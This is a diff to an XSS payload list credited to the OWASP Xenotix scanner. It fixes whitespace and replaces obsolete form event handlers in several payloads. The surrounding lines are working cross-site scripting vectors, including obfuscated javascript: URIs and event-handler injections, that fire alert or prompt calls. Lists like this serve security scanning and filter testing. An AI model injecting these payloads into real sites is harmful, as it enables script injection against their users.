@@ -1,5 +1,5 @@
 #
-# Original source is from 
+# Original source is from
 # https://github.com/ajinabraham/OWASP-Xenotix-XSS-Exploit-Framework/blob/master/Scanner/xenotix_main.resx
 #
 # * XML-decoded
@@ -351,8 +351,8 @@ foo%00<script>alert(1)</script>
 <form id="test" /><button form="test" formaction="javascript:alert(1)">X
 <form id="test" /><button form="test" formaction="javascript:javascript:alert(1)">X
 <form id="test"></form><button form="test" formaction="javascript:alert(1)">X</button>
-<form id=test onforminput=javascript:alert(1)><input></form><button form=test onformchange=javascript:alert(1)>X
-<form id=test onforminput=prompt(1)><input></form><button form=test onformchange=prompt(2)>X</button>
+<form id=test oninput=javascript:alert(1)><input></form><button form=test onchange=javascript:alert(1)>X
+<form id=test oninput=prompt(1)><input></form><button form=test onchange=prompt(2)>X</button>
 <form><iframe &#09;&#10;&#11; src="javascript&#58;alert(1)"&#11;&#10;&#09;;>
 <form><isindex formaction="javascript&colon;confirm(1)"
 <form name=self location="javascript&#58;alert(1)"></form><script>if(top!=self){ top.location=self.location}</script>
@@ -1171,8 +1171,8 @@ SCRIPT>">'><SCRIPT>alert(String.fromCharCode(75,67,70))</SCRIPT>
 <video src=1 href=1 onerror="javascript:alert(1)"></video>
 <video src=1 onerror=alert(1)>
 <vmlframe xmlns=urn:schemas-microsoft-com:vml style=behavior:url(#default#vml);position:absolute;width:100%25;height:100%25 src=%25(vml)s#kcf></vmlframe>
-X<form id=test><input></form><button form=test onformchange==javascript:alert(1)>X
-X<form id=test onforminput=javascript:alert(1)><input></form>
+X<form id=test><input></form><button form=test onchange==javascript:alert(1)>X
+X<form id=test oninput=javascript:alert(1)><input></form>
 <XML ID=0><I><B><IMG SRC="javas<!-- -->cript:alert(1)"></B></I></XML>
 <XML ID=0><I><B>&lt;IMG SRC="javas<!-- -->cript:alert(1)"&gt;</B></I></XML>
 <XML ID=I><X><C><![CDATA[<IMG SRC="javas]]><![CDATA[cript:alert(1);">]]>
